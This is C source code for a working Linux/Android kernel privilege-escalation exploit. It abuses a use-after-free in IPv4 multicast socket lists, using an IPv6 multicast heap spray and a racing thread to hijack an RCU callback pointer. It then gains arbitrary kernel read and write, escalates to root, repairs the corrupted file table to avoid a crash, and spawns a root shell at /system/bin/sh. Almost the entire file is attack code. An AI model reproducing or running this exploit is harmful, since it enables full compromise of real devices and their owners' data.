#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stddef.h>
#include <sched.h>
#include <unistd.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>
#include <sys/stat.h>
#include <sys/un.h>
#include <linux/igmp.h>
#include "util.h"

#define PORT 45555
#define PORT6 45556
#define MULTICAST_ADDR 0xe0000000
#define MAX_GREQ 300
#define TRY_SOCKET 600
#define MC_LIST_OFFSET 688
#define IPV6_MC_LIST_OFFSET 128

const struct in6_addr in6addr_loopback = IN6ADDR_LOOPBACK_INIT;
extern int escalate(char *name, char *init_task_addr);

struct ip_mc_socklist {
    struct ip_mc_socklist *next_rcu;
    struct ip_mreqn     multi;
    unsigned int        sfmode;     /* MCAST_{INCLUDE,EXCLUDE} */
    struct ip_sf_socklist *sflist;
    struct callback_head     rcu;
};

struct ipv6_mc_socklist {
	struct in6_addr		addr;
	int			ifindex;
	struct ipv6_mc_socklist *next;
	rwlock_t		sflock;
	unsigned int		sfmode;		/* MCAST_{INCLUDE,EXCLUDE} */
	struct ip6_sf_socklist	*sflist;
	struct callback_head		rcu;
};

const size_t rcu_offset = offsetof(struct ip_mc_socklist, rcu);

void *setter(void *arg) {
    void* pay = (void *) 0x2500000000;
    int base_offset = 0xff;
    struct callback_head *ptr;

    ptr = (struct callback_head *) ((char *) pay + base_offset + rcu_offset);
    while (ptr->next == (void *) 0xdeadbeef) {
        ptr->func = (void *) KERNEL_SETSOCKOPT;     
    }
    ptr->func = (void *) KERNEL_SETSOCKOPT;
    return NULL;
}

void *sender(void *arg)
{
	int sk, ret;
	struct sockaddr_in addr;

	sk = socket(AF_INET, SOCK_STREAM, 0);

	memset(&addr, 0, sizeof(addr));
	addr.sin_family = AF_INET;
	addr.sin_port = htons(PORT);
	/* a multicast address */
    addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK); 

	do {
		usleep(1);
		ret = connect(sk, (struct sockaddr *)&addr, sizeof(addr));
	} while (ret < 0);
    return NULL;
}

void setcpu(int num) {
    cpu_set_t my_set;

    CPU_ZERO(&my_set);
    CPU_SET(num, &my_set);
    if (sched_setaffinity(0, sizeof(my_set), &my_set) != 0) {
        perror("[-] sched_setaffinity()");
        exit(EXIT_FAILURE);
    }
}

int find_corruption(struct ipv6_mc_socklist *mc_list) {
    struct ipv6_mc_socklist curr;
    int ret;
    
    do {
        ret = mread((char *) &curr, (char *) mc_list, sizeof(struct ipv6_mc_socklist));
        if (ret == -1) {
            perror("[!] mread find_corruption");
            return -1;
        }
        if (((uint64_t) curr.sflist) == rcu_offset) {
            return 1;
        }
        mc_list = curr.next;
    } while (mc_list != NULL);
    return 0; 
}

int fix_crash(int *sockets, int len) {
    int ret;
    int i, j;
    int fd;
    char *pinet6;
    struct ipv6_mc_socklist *mc_list;
    char *files;
    uint64_t null = 0;

    // kallsyms has been opened before we corrupted the file table
    ret = locate_files();
    if (ret == -1) {
        return -1;
    }
    for (i = 0; i < len; i++) {
        fd = sockets[i];
        ret = get_ipv6_pinfo(fd, &pinet6);
        if (ret == -1) {
            printf("[!] can't find ipv6 info for this socket %d\n", fd);
            continue;
        }
        ret = mread((char *) &mc_list, (pinet6 + IPV6_MC_LIST_OFFSET), sizeof(mc_list));
        if (ret == -1) {
            perror("[!] mread fix_crash ipv6_mc_socklist");
            return -1;
        }
        ret = find_corruption(mc_list);
        if (ret == 1) {
            printf("[+] found corrupted socket discriptor %d\n", fd);
            get_files(info.loc_curr_task, &files); 
            ret = mwrite((char *) &null, files + fd * incr, sizeof(null));
            if (ret == -1) {
                perror("[!] mwrite fix_crash patching file table failed");
            } else {
                printf("[+] crashed socket removed\n");
            }
            for (j = i + 1; j < len; j++) {
                close(sockets[j]);
            }
            return 0;
        }
        close(fd);
    }
    return -1;
}

int main(int argc, char **argv)
{
	int sk0;
    int sk1;
	struct group_req greq;
	struct sockaddr_in addr;
    int i, j, ret;
	pthread_t thread;
    int enable = 1;

    int sk5[TRY_SOCKET];
    struct group_req greq1[MAX_GREQ];
    struct sockaddr_in6 addr1;
    void *pay;
    struct ip_mc_socklist fake;
    struct callback_head fake_rcu;
    struct in6_addr fake_addr =                                                 
    { { 
        { 0xff, 0x00, 0x00, 0x00,                                                 
          0x25, 0x00, 0x00, 0x00,                                                 
          0xef, 0xbe, 0xad, 0xde,                                                 
          0xbe, 0xba, 0xfe, 0xca,                                                 
        } 
      }
    };
    const int base_offset = 0xff;

    setcpu(1);
    memset(&fake, 0, sizeof(struct ip_mc_socklist));
    memset(&fake_rcu, 0, sizeof(struct callback_head));
    memset(&greq1, 0, sizeof(greq1));
    memset(&greq, 0, sizeof(greq));
    memset(&addr1, 0, sizeof(addr1));
    memset(&addr, 0, sizeof(addr));

    pay = mmap((void *) 0x2500000000, PAGE_SIZE, PROT_EXEC | PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (pay == MAP_FAILED) {
        perror("mmap");
        return -1;
    }

    // fake structure for kernel_setsockopt
    *((uint64_t *)(0x250000011f + 40)) = 0x2500000300;
    *((uint64_t *)(0x2500000300 + 104)) = (uint64_t) SKIP_SETFS;

    sk0 = socket(AF_INET, SOCK_STREAM, 0);
    if (setsockopt(sk0, SOL_SOCKET, SO_REUSEADDR, &enable, sizeof(int)) < 0) {
        perror("setsockopt(SO_REUSEADDR) failed");
        return -1;
    }

    for (i = 0; i < TRY_SOCKET; i++) {
        // ipv6 socket for heap spray
        sk5[i] = socket(AF_INET6, SOCK_STREAM, 0);
    }

    addr1.sin6_port = htons(PORT6); 
    addr1.sin6_family = AF_INET6;
    for (i = 0; i < MAX_GREQ; i++) {
        // different address for spraying
        fake_addr.s6_addr[8] = i & 0xff;
        fake_addr.s6_addr[9] = i >> 8;
        addr1.sin6_addr = fake_addr;
        memcpy(&greq1[i].gr_group, &addr1, sizeof(addr1));
        greq1[i].gr_interface = 1;
    }

    addr.sin_port = htons(PORT);
    addr.sin_family = AF_INET;

    /* a multicast address */
    addr.sin_addr.s_addr = htonl(MULTICAST_ADDR);
    memcpy(&greq.gr_group, &addr, sizeof(addr));
    greq.gr_interface = 1;
    /* alloc in ip_mc_join_group by option MCAST_JOIN_GROUP */
    ret = setsockopt(sk0, SOL_IP, MCAST_JOIN_GROUP, &greq, sizeof(greq));
    if (ret < 0) {
        perror("setsockopt");
        return -1;
    }

    addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    ret = bind(sk0, (struct sockaddr *) &addr, sizeof(addr)); 
    if (ret < 0) {
        perror("bind");
        return -1;
    }
    ret = listen(sk0, 1);
    if (ret < 0) {
        perror("listen");
        return -1;
    }

	pthread_create(&thread, NULL, sender, NULL);

    sk1 = accept(sk0, NULL, NULL);
    if (sk1 < 0) {
        perror("accept");
        return -1;
    }
    pthread_join(thread, NULL);
    printf("[+] working on rooting...\n");
    //setcpu(1);
    close(sk0);

    // wait for kfree to be scheduled
    sleep(1);
    for (i = 0; i < TRY_SOCKET; i++) {
        for (j = 0; j < MAX_GREQ; j++) {
            setsockopt(sk5[i], SOL_IPV6, MCAST_JOIN_GROUP, &greq1[j], sizeof(greq1[j]));
        }
    }

    // since kfree_rcu resets our function pointer to the offset 0x20, we need
    // to reset it after our heap spray
    //
    // reset func pointer after __call_rcu to our user address 
    // so we can contol it in rcu_reclaim
    fake_rcu.next = (void *) 0xdeadbeef;
    fake.rcu = fake_rcu;
    memcpy(pay + base_offset, &fake, sizeof(fake));

    pthread_create(&thread, NULL, setter, NULL);
    printf("[+] triggering bug\n");
    printf("[+] testing arbitray read ... ");
    fflush(0);
    close(sk1);
    // wait for rcu_reclaim to schedule
    while (write(1, (void *) 0xFFFFFFC000E4F760, 10) == -1) {
        // busy loop so we get setfs on this thread
        close(dup(0));
    }
    pthread_join(thread, NULL);
    printf("\n");
    printf("[+] gained arbitrary read and write\n");
    printf("[+] escalating priviledge\n");
    ret = escalate(argv[0], NULL);
    if (ret == -1) {
        printf("[!] escalating to root failed\n");
        return -1;
    }
    printf("[+] escalated to root\n");
    if (fix_crash(sk5, TRY_SOCKET) == -1) {
        printf("[!] crash fixing failed, your system might reboot after exiting the shell\n");
    } else {
        printf("[+] fixed corruption\n");
    }
    kallsyms_destruct();
    printf("[*] enjoy your root shell\n");
    system("/system/bin/sh");
	return 0;
}
